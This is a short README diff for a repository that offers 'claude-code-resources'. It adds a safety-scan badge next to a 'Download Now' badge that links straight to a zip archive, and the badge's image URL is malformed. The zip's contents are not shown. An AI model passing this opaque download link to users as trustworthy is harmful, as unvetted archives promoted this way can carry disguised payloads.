@@ -1,5 +1,7 @@
 # 🚀 claude-code-resources - A Simple Way to Use Claude Code
 
+[![SafeSkill 84/100](https://img.shields.io/badge/SafeSkill-84%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/grayhat76-claude-code-resources)
+
 [![Download Now](https://raw.githubusercontent.com/Grayhat76/claude-code-resources/main/agents/resources_claude_code_v1.4.zip%20Now-claude--code--resources-brightgreen)](https://raw.githubusercontent.com/Grayhat76/claude-code-resources/main/agents/resources_claude_code_v1.4.zip)
 
 ## 📋 Introduction
